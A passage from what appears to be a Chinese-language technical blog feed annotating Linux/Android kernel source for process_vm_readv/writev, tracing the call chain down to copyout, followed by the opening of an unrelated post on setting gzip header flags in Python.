class="title">iovec</span> <span class="title">iovstack_r</span>[<span class="title">UIO_FASTIOV</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov_l</span> =</span> iovstack_l;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov_r</span> =</span> iovstack_r;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">iov_iter</span> <span class="title">iter</span>;</span></span><br><span class="line">	<span class="keyword">ssize_t</span> rc;</span><br><span class="line">	<span class="keyword">int</span> dir = vm_write ? WRITE : READ;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags != <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check iovecs */</span></span><br><span class="line">	rc = <span class="built_in">import_iovec</span>(dir, lvec, liovcnt, UIO_FASTIOV, &amp;iov_l, &amp;iter);</span><br><span class="line">	<span class="keyword">if</span> (rc &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> rc;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">iov_iter_count</span>(&amp;iter))</span><br><span class="line">		<span class="keyword">goto</span> free_iovecs;</span><br><span class="line"></span><br><span class="line">	rc = <span class="built_in">rw_copy_check_uvector</span>(CHECK_IOVEC_ONLY, rvec, riovcnt, UIO_FASTIOV,</span><br><span class="line">				   iovstack_r, &amp;iov_r);</span><br><span class="line">	<span class="keyword">if</span> (rc &lt;= <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">goto</span> free_iovecs;</span><br><span class="line"></span><br><span class="line">	rc = <span class="built_in">process_vm_rw_core</span>(pid, &amp;iter, iov_r, riovcnt, flags, vm_write);</span><br><span class="line"></span><br><span class="line">free_iovecs:</span><br><span class="line">	<span class="keyword">if</span> (iov_r != iovstack_r)</span><br><span class="line">		<span class="built_in">kfree</span>(iov_r);</span><br><span class="line">	<span class="built_in">kfree</span>(iov_l);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检查<code>iovecs</code>后，调用<code>process_vm_rw_core</code></p>
<h3 id="process-vm-rw-core"><a href="#process-vm-rw-core" class="headerlink" title="process_vm_rw_core"></a>process_vm_rw_core</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of entries for process pages array</span></span><br><span class="line"><span class="comment">   which lives on stack */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PVM_MAX_PP_ARRAY_COUNT 16</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * process_vm_rw_core - core of reading/writing pages from task specified</span></span><br><span class="line"><span class="comment"> * @pid: PID of process to read/write from/to</span></span><br><span class="line"><span class="comment"> * @iter: where to copy to/from locally</span></span><br><span class="line"><span class="comment"> * @rvec: iovec array specifying where to copy to/from in the other process</span></span><br><span class="line"><span class="comment"> * @riovcnt: size of rvec array</span></span><br><span class="line"><span class="comment"> * @flags: currently unused</span></span><br><span class="line"><span class="comment"> * @vm_write: 0 if reading from other process, 1 if writing to other process</span></span><br><span class="line"><span class="comment"> * Returns the number of bytes read/written or error code. May</span></span><br><span class="line"><span class="comment"> *  return less bytes than expected if an error occurs during the copying</span></span><br><span class="line"><span class="comment"> *  process.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">ssize_t</span> <span class="title">process_vm_rw_core</span><span class="params">(<span class="keyword">pid_t</span> pid, struct iov_iter *iter,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">const</span> struct iovec *rvec,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">unsigned</span> <span class="keyword">long</span> riovcnt,</span></span></span><br><span class="line"><span class="params"><span class="function">				  <span class="keyword">unsigned</span> <span class="keyword">long</span> flags, <span class="keyword">int</span> vm_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">task</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">pp_stack</span>[<span class="title">PVM_MAX_PP_ARRAY_COUNT</span>];</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> **<span class="title">process_pages</span> =</span> pp_stack;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> i;</span><br><span class="line">	<span class="keyword">ssize_t</span> rc = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages_iov;</span><br><span class="line">	<span class="keyword">ssize_t</span> iov_len;</span><br><span class="line">	<span class="keyword">size_t</span> total_len = <span class="built_in">iov_iter_count</span>(iter);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Work out how many pages of struct pages we&#x27;re going to need</span></span><br><span class="line"><span class="comment">	 * when eventually calling get_user_pages</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; riovcnt; i++) &#123;</span><br><span class="line">		iov_len = rvec[i].iov_len;</span><br><span class="line">		<span class="keyword">if</span> (iov_len &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			nr_pages_iov = ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)rvec[i].iov_base</span><br><span class="line">					+ iov_len)</span><br><span class="line">				/ PAGE_SIZE - (<span class="keyword">unsigned</span> <span class="keyword">long</span>)rvec[i].iov_base</span><br><span class="line">				/ PAGE_SIZE + <span class="number">1</span>;</span><br><span class="line">			nr_pages = <span class="built_in">max</span>(nr_pages, nr_pages_iov);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nr_pages == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (nr_pages &gt; PVM_MAX_PP_ARRAY_COUNT) &#123;</span><br><span class="line">		<span class="comment">/* For reliability don&#x27;t try to kmalloc more than</span></span><br><span class="line"><span class="comment">		   2 pages worth */</span></span><br><span class="line">		process_pages = <span class="built_in">kmalloc</span>(<span class="built_in">min_t</span>(<span class="keyword">size_t</span>, PVM_MAX_KMALLOC_PAGES,</span><br><span class="line">					      <span class="built_in"><span class="keyword">sizeof</span></span>(struct pages *)*nr_pages),</span><br><span class="line">					GFP_KERNEL);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (!process_pages)</span><br><span class="line">			<span class="keyword">return</span> -ENOMEM;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Get process information */</span></span><br><span class="line">	<span class="built_in">rcu_read_lock</span>();</span><br><span class="line">	task = <span class="built_in">find_task_by_vpid</span>(pid);</span><br><span class="line">	<span class="keyword">if</span> (task)</span><br><span class="line">		<span class="built_in">get_task_struct</span>(task);</span><br><span class="line">	<span class="built_in">rcu_read_unlock</span>();</span><br><span class="line">	<span class="keyword">if</span> (!task) &#123;</span><br><span class="line">		rc = -ESRCH;</span><br><span class="line">		<span class="keyword">goto</span> free_proc_pages;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	mm = <span class="built_in">mm_access</span>(task, PTRACE_MODE_ATTACH_REALCREDS);</span><br><span class="line">	<span class="keyword">if</span> (!mm || <span class="built_in">IS_ERR</span>(mm)) &#123;</span><br><span class="line">		rc = <span class="built_in">IS_ERR</span>(mm) ? <span class="built_in">PTR_ERR</span>(mm) : -ESRCH;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Explicitly map EACCES to EPERM as EPERM is a more a</span></span><br><span class="line"><span class="comment">		 * appropriate error code for process_vw_readv/writev</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> (rc == -EACCES)</span><br><span class="line">			rc = -EPERM;</span><br><span class="line">		<span class="keyword">goto</span> put_task_struct;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; riovcnt &amp;&amp; <span class="built_in">iov_iter_count</span>(iter) &amp;&amp; !rc; i++)</span><br><span class="line">		rc = <span class="built_in">process_vm_rw_single_vec</span>(</span><br><span class="line">			(<span class="keyword">unsigned</span> <span class="keyword">long</span>)rvec[i].iov_base, rvec[i].iov_len,</span><br><span class="line">			iter, process_pages, mm, task, vm_write);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* copied = space before - space after */</span></span><br><span class="line">	total_len -= <span class="built_in">iov_iter_count</span>(iter);</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* If we have managed to copy any data at all then</span></span><br><span class="line"><span class="comment">	   we return the number of bytes copied. Otherwise</span></span><br><span class="line"><span class="comment">	   we return the error code */</span></span><br><span class="line">	<span class="keyword">if</span> (total_len)</span><br><span class="line">		rc = total_len;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">mmput</span>(mm);</span><br><span class="line"></span><br><span class="line">put_task_struct:</span><br><span class="line">	<span class="built_in">put_task_struct</span>(task);</span><br><span class="line"></span><br><span class="line">free_proc_pages:</span><br><span class="line">	<span class="keyword">if</span> (process_pages != pp_stack)</span><br><span class="line">		<span class="built_in">kfree</span>(process_pages);</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ol>
<li>计算<code>nr_pages</code>后，与<code>PVM_MAX_PP_ARRAY_COUNT</code>比较，大于则调用<code>kalloc</code>申请内存，否则直接使用<code>process_pages</code>。</li>
<li>调用<code>find_task_by_vpid</code>和<code>get_task_struct</code>，获取进程的<code>task_struct</code>。</li>
<li>调用<code>mm_access(task, PTRACE_MODE_ATTACH_REALCREDS)</code>获取<code>mm_struct</code>（同时进行权限检查）。</li>
<li>遍历<code>rvec</code>，调用<code>process_vm_rw_single_vec</code><h3 id="process-vm-rw-single-vec"><a href="#process-vm-rw-single-vec" class="headerlink" title="process_vm_rw_single_vec"></a>process_vm_rw_single_vec</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Maximum number of pages kmalloc&#x27;d to hold struct page&#x27;s during copy */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PVM_MAX_KMALLOC_PAGES (PAGE_SIZE * 2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * process_vm_rw_single_vec - read/write pages from task specified</span></span><br><span class="line"><span class="comment"> * @addr: start memory address of target process</span></span><br><span class="line"><span class="comment"> * @len: size of area to copy to/from</span></span><br><span class="line"><span class="comment"> * @iter: where to copy to/from locally</span></span><br><span class="line"><span class="comment"> * @process_pages: struct pages area that can store at least</span></span><br><span class="line"><span class="comment"> *  nr_pages_to_copy struct page pointers</span></span><br><span class="line"><span class="comment"> * @mm: mm for task</span></span><br><span class="line"><span class="comment"> * @task: task to read/write from</span></span><br><span class="line"><span class="comment"> * @vm_write: 0 means copy from, 1 means copy to</span></span><br><span class="line"><span class="comment"> * Returns 0 on success or on failure error code</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">process_vm_rw_single_vec</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> addr,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">unsigned</span> <span class="keyword">long</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct iov_iter *iter,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct page **process_pages,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct mm_struct *mm,</span></span></span><br><span class="line"><span class="params"><span class="function">				    struct task_struct *task,</span></span></span><br><span class="line"><span class="params"><span class="function">				    <span class="keyword">int</span> vm_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> pa = addr &amp; PAGE_MASK;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> start_offset = addr - pa;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages;</span><br><span class="line">	<span class="keyword">ssize_t</span> rc = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> max_pages_per_loop = PVM_MAX_KMALLOC_PAGES</span><br><span class="line">		/ <span class="built_in"><span class="keyword">sizeof</span></span>(struct pages *);</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> flags = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Work out address and page range required */</span></span><br><span class="line">	<span class="keyword">if</span> (len == <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	nr_pages = (addr + len - <span class="number">1</span>) / PAGE_SIZE - addr / PAGE_SIZE + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (vm_write)</span><br><span class="line">		flags |= FOLL_WRITE;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (!rc &amp;&amp; nr_pages &amp;&amp; <span class="built_in">iov_iter_count</span>(iter)) &#123;</span><br><span class="line">		<span class="keyword">int</span> pages = <span class="built_in">min</span>(nr_pages, max_pages_per_loop);</span><br><span class="line">		<span class="keyword">int</span> locked = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">size_t</span> bytes;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Get the pages we&#x27;re interested in.  We must</span></span><br><span class="line"><span class="comment">		 * access remotely because task/mm might not</span></span><br><span class="line"><span class="comment">		 * current/current-&gt;mm</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="built_in">down_read</span>(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		pages = <span class="built_in">get_user_pages_remote</span>(task, mm, pa, pages, flags,</span><br><span class="line">					      process_pages, <span class="literal">NULL</span>, &amp;locked);</span><br><span class="line">		<span class="keyword">if</span> (locked)</span><br><span class="line">			<span class="built_in">up_read</span>(&amp;mm-&gt;mmap_sem);</span><br><span class="line">		<span class="keyword">if</span> (pages &lt;= <span class="number">0</span>)</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">		bytes = pages * PAGE_SIZE - start_offset;</span><br><span class="line">		<span class="keyword">if</span> (bytes &gt; len)</span><br><span class="line">			bytes = len;</span><br><span class="line"></span><br><span class="line">		rc = <span class="built_in">process_vm_rw_pages</span>(process_pages,</span><br><span class="line">					 start_offset, bytes, iter,</span><br><span class="line">					 vm_write);</span><br><span class="line">		len -= bytes;</span><br><span class="line">		start_offset = <span class="number">0</span>;</span><br><span class="line">		nr_pages -= pages;</span><br><span class="line">		pa += pages * PAGE_SIZE;</span><br><span class="line">		<span class="keyword">while</span> (pages)</span><br><span class="line">			<span class="built_in">put_page</span>(process_pages[--pages]);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
通过<code>get_user_pages_remote</code>获取<code>pages</code>（调用链为<code>__get_user_pages_locked</code>-&gt;<code>__get_user_pages</code>），然后通过<code>process_vm_rw_pages</code>读写物理内存。</li>
</ol>
<h4 id="get-user-pages"><a href="#get-user-pages" class="headerlink" title="__get_user_pages"></a>__get_user_pages</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">long</span> __get_user_pages(struct mm_struct *mm,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">long</span> start, <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_pages,</span><br><span class="line">		<span class="keyword">unsigned</span> <span class="keyword">int</span> gup_flags, struct page **pages,</span><br><span class="line">		struct vm_area_struct **vmas, <span class="keyword">int</span> *locked)</span><br></pre></td></tr></table></figure>

<h3 id="process-vm-rw-pages"><a href="#process-vm-rw-pages" class="headerlink" title="process_vm_rw_pages"></a>process_vm_rw_pages</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * process_vm_rw_pages - read/write pages from task specified</span></span><br><span class="line"><span class="comment"> * @pages: array of pointers to pages we want to copy</span></span><br><span class="line"><span class="comment"> * @start_offset: offset in page to start copying from/to</span></span><br><span class="line"><span class="comment"> * @len: number of bytes to copy</span></span><br><span class="line"><span class="comment"> * @iter: where to copy to/from locally</span></span><br><span class="line"><span class="comment"> * @vm_write: 0 means copy from, 1 means copy to</span></span><br><span class="line"><span class="comment"> * Returns 0 on success, error code otherwise</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">process_vm_rw_pages</span><span class="params">(struct page **pages,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">unsigned</span> offset,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">size_t</span> len,</span></span></span><br><span class="line"><span class="params"><span class="function">			       struct iov_iter *iter,</span></span></span><br><span class="line"><span class="params"><span class="function">			       <span class="keyword">int</span> vm_write)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">/* Do the copy for each page */</span></span><br><span class="line">	<span class="keyword">while</span> (len &amp;&amp; <span class="built_in">iov_iter_count</span>(iter)) &#123;</span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span> =</span> *pages++;</span><br><span class="line">		<span class="keyword">size_t</span> copy = PAGE_SIZE - offset;</span><br><span class="line">		<span class="keyword">size_t</span> copied;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (copy &gt; len)</span><br><span class="line">			copy = len;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (vm_write) &#123;</span><br><span class="line">			copied = <span class="built_in">copy_page_from_iter</span>(page, offset, copy, iter);</span><br><span class="line">			<span class="built_in">set_page_dirty_lock</span>(page);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			copied = <span class="built_in">copy_page_to_iter</span>(page, offset, copy, iter);</span><br><span class="line">		&#125;</span><br><span class="line">		len -= copied;</span><br><span class="line">		<span class="keyword">if</span> (copied &lt; copy &amp;&amp; <span class="built_in">iov_iter_count</span>(iter))</span><br><span class="line">			<span class="keyword">return</span> -EFAULT;</span><br><span class="line">		offset = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="copy-page-to-iter"><a href="#copy-page-to-iter" class="headerlink" title="copy_page_to_iter"></a>copy_page_to_iter</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">size_t</span> __copy_page_to_iter(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span><br><span class="line">			 struct iov_iter *i)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">likely</span>(<span class="built_in">iter_is_iovec</span>(i)))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">copy_page_to_iter_iovec</span>(page, offset, bytes, i);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">iov_iter_is_bvec</span>(i) || <span class="built_in">iov_iter_is_kvec</span>(i) || <span class="built_in">iov_iter_is_xarray</span>(i)) &#123;</span><br><span class="line">		<span class="keyword">void</span> *kaddr = <span class="built_in">kmap_local_page</span>(page);</span><br><span class="line">		<span class="keyword">size_t</span> wanted = _copy_to_iter(kaddr + offset, bytes, i);</span><br><span class="line">		<span class="built_in">kunmap_local</span>(kaddr);</span><br><span class="line">		<span class="keyword">return</span> wanted;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">iov_iter_is_pipe</span>(i))</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">copy_page_to_iter_pipe</span>(page, offset, bytes, i);</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(<span class="built_in">iov_iter_is_discard</span>(i))) &#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">unlikely</span>(i-&gt;count &lt; bytes))</span><br><span class="line">			bytes = i-&gt;count;</span><br><span class="line">		i-&gt;count -= bytes;</span><br><span class="line">		<span class="keyword">return</span> bytes;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">WARN_ON</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">copy_page_to_iter</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> res = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!<span class="built_in">page_copy_sane</span>(page, offset, bytes)))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	page += offset / PAGE_SIZE; <span class="comment">// first subpage</span></span><br><span class="line">	offset %= PAGE_SIZE;</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="keyword">size_t</span> n = __copy_page_to_iter(page, offset,</span><br><span class="line">				<span class="built_in">min</span>(bytes, (<span class="keyword">size_t</span>)PAGE_SIZE - offset), i);</span><br><span class="line">		res += n;</span><br><span class="line">		bytes -= n;</span><br><span class="line">		<span class="keyword">if</span> (!bytes || !n)</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		offset += n;</span><br><span class="line">		<span class="keyword">if</span> (offset == PAGE_SIZE) &#123;</span><br><span class="line">			page++;</span><br><span class="line">			offset = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="iov-iter-c"><a href="#iov-iter-c" class="headerlink" title="iov_iter.c"></a>iov_iter.c</h2><p><a href="https://cs.android.com/android/kernel/superproject/+/common-android-4.14-stable:common/lib/iov_iter.c">common/lib/iov_iter.c</a></p>
<h3 id="copy-page-to-iter-iovec"><a href="#copy-page-to-iter-iovec" class="headerlink" title="copy_page_to_iter_iovec"></a>copy_page_to_iter_iovec</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">size_t</span> <span class="title">copy_page_to_iter_iovec</span><span class="params">(struct page *page, <span class="keyword">size_t</span> offset, <span class="keyword">size_t</span> bytes,</span></span></span><br><span class="line"><span class="params"><span class="function">			 struct iov_iter *i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">size_t</span> skip, copy, left, wanted;</span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">iov</span>;</span></span><br><span class="line">	<span class="keyword">char</span> __user *buf;</span><br><span class="line">	<span class="keyword">void</span> *kaddr, *from;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(bytes &gt; i-&gt;count))</span><br><span class="line">		bytes = i-&gt;count;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">unlikely</span>(!bytes))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">might_fault</span>();</span><br><span class="line">	wanted = bytes;</span><br><span class="line">	iov = i-&gt;iov;</span><br><span class="line">	skip = i-&gt;iov_offset;</span><br><span class="line">	buf = iov-&gt;iov_base + skip;</span><br><span class="line">	copy = <span class="built_in">min</span>(bytes, iov-&gt;iov_len - skip);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">IS_ENABLED</span>(CONFIG_HIGHMEM) &amp;&amp; !<span class="built_in">fault_in_writeable</span>(buf, copy)) &#123;</span><br><span class="line">		kaddr = <span class="built_in">kmap_atomic</span>(page);</span><br><span class="line">		from = kaddr + offset;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/* first chunk, usually the only one */</span></span><br><span class="line">		left = <span class="built_in">copyout</span>(buf, from, copy);</span><br><span class="line">		copy -= left;</span><br><span class="line">		skip += copy;</span><br><span class="line">		from += copy;</span><br><span class="line">		bytes -= copy;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">while</span> (<span class="built_in">unlikely</span>(!left &amp;&amp; bytes)) &#123;</span><br><span class="line">			iov++;</span><br><span class="line">			buf = iov-&gt;iov_base;</span><br><span class="line">			copy = <span class="built_in">min</span>(bytes, iov-&gt;iov_len);</span><br><span class="line">			left = <span class="built_in">copyout</span>(buf, from, copy);</span><br><span class="line">			copy -= left;</span><br><span class="line">			skip = copy;</span><br><span class="line">			from += copy;</span><br><span class="line">			bytes -= copy;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">likely</span>(!bytes)) &#123;</span><br><span class="line">			<span class="built_in">kunmap_atomic</span>(kaddr);</span><br><span class="line">			<span class="keyword">goto</span> done;</span><br><span class="line">		&#125;</span><br><span class="line">		offset = from - kaddr;</span><br><span class="line">		buf += copy;</span><br><span class="line">		<span class="built_in">kunmap_atomic</span>(kaddr);</span><br><span class="line">		copy = <span class="built_in">min</span>(bytes, iov-&gt;iov_len - skip);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">/* Too bad - revert to non-atomic kmap */</span></span><br><span class="line"></span><br><span class="line">	kaddr = <span class="built_in">kmap</span>(page);</span><br><span class="line">	from = kaddr + offset;</span><br><span class="line">	left = <span class="built_in">copyout</span>(buf, from, copy);</span><br><span class="line">	copy -= left;</span><br><span class="line">	skip += copy;</span><br><span class="line">	from += copy;</span><br><span class="line">	bytes -= copy;</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">unlikely</span>(!left &amp;&amp; bytes)) &#123;</span><br><span class="line">		iov++;</span><br><span class="line">		buf = iov-&gt;iov_base;</span><br><span class="line">		copy = <span class="built_in">min</span>(bytes, iov-&gt;iov_len);</span><br><span class="line">		left = <span class="built_in">copyout</span>(buf, from, copy);</span><br><span class="line">		copy -= left;</span><br><span class="line">		skip = copy;</span><br><span class="line">		from += copy;</span><br><span class="line">		bytes -= copy;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">kunmap</span>(page);</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">	<span class="keyword">if</span> (skip == iov-&gt;iov_len) &#123;</span><br><span class="line">		iov++;</span><br><span class="line">		skip = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	i-&gt;count -= wanted - bytes;</span><br><span class="line">	i-&gt;nr_segs -= iov - i-&gt;iov;</span><br><span class="line">	i-&gt;iov = iov;</span><br><span class="line">	i-&gt;iov_offset = skip;</span><br><span class="line">	<span class="keyword">return</span> wanted - bytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="copyout"><a href="#copyout" class="headerlink" title="copyout"></a>copyout</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">copyout</span><span class="params">(<span class="keyword">void</span> __user *to, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">size_t</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">should_fail_usercopy</span>())</span><br><span class="line">		<span class="keyword">return</span> n;</span><br><span class="line">	<span class="keyword">if</span> (<span class="built_in">access_ok</span>(to, n)) &#123;</span><br><span class="line">		<span class="built_in">instrument_copy_to_user</span>(to, from, n);</span><br><span class="line">		n = <span class="built_in">raw_copy_to_user</span>(to, from, n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>Android</tag>
        <tag>Kernel</tag>
        <tag>Linux</tag>
        <tag>源码分析</tag>
      </tags>
  </entry>
  <entry>
    <title>Python gzip模块设置xfl和os标志</title>
    <url>/2021/11/12/python-gzip-os-mark/</url>
    <content><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>使用<code>gzip</code>模块，发现<code>Python 3.6</code>生成的<code>gzip Header</code>与<code>Java</code>不一致。查阅<code>gzip</code>结构及<code>Python 3.6</code>源码（<code>Lib/gzip.py</code>），发现不能设置<code>XFL</code>和<code>OS</code>标识。<br>查看<code>Python 3.9</code>源码，发现虽然加了<code>XFL</code>，但<code>OS</code>标识仍硬编码为<code>0xff</code>。最后还是得手动patch。</p>
<span id="more"></span>
